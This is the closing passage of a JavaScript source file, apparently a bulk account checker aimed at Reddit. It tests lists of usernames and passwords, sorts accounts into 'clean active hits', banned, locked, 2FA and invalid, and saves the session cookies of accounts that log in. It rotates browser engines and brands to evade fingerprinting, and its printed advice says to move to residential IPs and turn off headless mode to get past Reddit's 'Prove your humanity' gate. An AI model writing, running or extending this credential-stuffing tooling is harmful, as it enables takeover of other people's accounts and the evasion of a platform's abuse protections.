        const brandLabel = `${res.brandId || 'browser'} [${res.engine || '?'}/${res.os || '?'}]`;
        stats.byBrand[res.brandId || 'unknown'] = (stats.byBrand[res.brandId || 'unknown'] || 0) + 1;
        stats.byEngine[res.engine || 'unknown'] = (stats.byEngine[res.engine || 'unknown'] || 0) + 1;

        const sec = ((res.durationMs || 0) / 1000).toFixed(1);
        const progressTag = `[${String(stats.checked).padStart(String(accounts.length).length, ' ')}/${accounts.length}]`;

        const outcome = recordAccountOutcome({ res, acct, stats, outPaths });

        // W16: persist this account's device cookies for future returning-device sessions
        if (deviceCacheEnabled && res.cookies && typeof res.cookies === 'object') {
          const subset = {};
          for (const k of ['loid', 'rdt', 'edgebucket', 'csv']) {
            if (res.cookies[k]) subset[k] = String(res.cookies[k]);
          }
          if (Object.keys(subset).length > 0) {
            deviceCache[acct.username.toLowerCase()] = subset;
            try {
              // Atomic: a Ctrl+C mid-write must not truncate the whole cache (it is default-on).
              writeJsonAtomic(deviceCachePath, deviceCache);
            } catch {
              // cache write failure is non-fatal
            }
          }
        }
        console.log(
          `${progressTag} ${outcome.tag} ${C.bold}${acct.username}${C.reset} -> ${outcome.summaryText} via ${C.cyan}${brandLabel}${C.reset} (${sec}s)`
        );

        updateTitle();
      },
    });
  } finally {
    shutdown.dispose();
    await pool.shutdown().catch(() => {});
    await destroyTLS().catch(() => {});
  }

  const totalSec = ((Date.now() - startedAt) / 1000).toFixed(1);
  console.log('\n========================================================================');
  console.log(`${C.bold}                   BULK CHECKER FINAL SUMMARY${C.reset}`);
  console.log('========================================================================');
  console.log(`  Total Checked        : ${stats.checked}/${accounts.length} (${totalSec}s)`);
  console.log(`  ${C.brightGreen}${C.bold}Clean Active Hits    : ${stats.hits}${C.reset}  -> ${outPaths.hits} (+ hits_clean.txt)`);
  console.log(`  ${C.red}${C.bold}Banned / Shadowban   : ${stats.banned}${C.reset}  -> ${outPaths.banned}`);
  console.log(`  ${C.yellow}${C.bold}Password Reset/Lock  : ${stats.passwordReset}${C.reset}  -> ${outPaths.passwordReset}`);
  console.log(`  ${C.cyan}2FA / OTP Required   : ${stats.twoFa}${C.reset}  -> ${outPaths.twoFa}`);
  console.log(`  ${C.red}Invalid Credentials  : ${stats.invalid}${C.reset}  -> ${outPaths.invalid}`);
  console.log(`  ${C.magenta}Errors / Retry       : ${stats.errors}${C.reset}  -> ${outPaths.errors}`);
  console.log('------------------------------------------------------------------------');
  console.log(
    `  Engines Rotated      : ${Object.entries(stats.byEngine)
      .map(([k, v]) => `${k}(${v})`)
      .join(', ') || 'none'}`
  );
  console.log(
    `  Brands Rotated       : ${Object.entries(stats.byBrand)
      .map(([k, v]) => `${k}(${v})`)
      .join(', ') || 'none'}`
  );
  if (stats.hits > 0) {
    console.log(`  Clean Hit Cookies    : ${outPaths.hitsCookiesJsonl}`);
  }
  if (stats.wafBlocked > 0) {
    console.log('------------------------------------------------------------------------');
    console.log(
      `  ${C.yellow}${C.bold}${stats.wafBlocked} account(s) hit Reddit's "Prove your humanity" gate and were NOT tested.${C.reset}`
    );
    console.log(
      '  Fix the egress IP, not the account: use a residential/home connection (datacenter proxies'
    );
    console.log(
      '  are gated 100% of the time), keep HEADLESS=false, and leave DISABLE_HTTP2=1.'
    );
  }
  console.log('========================================================================\n');
}

module.exports = {
  parseAccountsText,
  normalizeProxyLine,
  parseProxiesText,
  createOutPaths,
  recordAccountOutcome,
  resolveEffectiveSolverMode,
  describeResourceProfile,
  runBulkChecker,
};

if (require.main === module) {
  runBulkChecker().catch((err) => {
    console.error(`\n${C.red}[FATAL CHECKER ERROR] ${err.stack || err.message}${C.reset}`);
    process.exit(1);
  });
}
